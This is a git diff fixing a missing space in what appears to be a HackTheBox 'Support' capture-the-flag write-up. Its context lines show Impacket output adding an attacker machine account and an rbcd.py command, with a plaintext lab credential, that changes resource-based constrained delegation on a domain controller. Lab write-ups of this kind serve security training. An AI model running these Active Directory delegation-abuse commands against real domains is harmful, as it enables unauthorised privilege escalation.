@@ -156,7 +156,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Successfully added machine account ATTACK$ with password AttackerPC1!.
 ```
 
-Then I have used [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py)to modify delegation rights.
+Then I have used [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) to modify delegation rights.
 
 ```
 └─$ python rbcd.py -dc-ip 10.10.11.174 -t dc -f 'ATTACK' support.htb\\support:Ironside47pleasure40Watchful
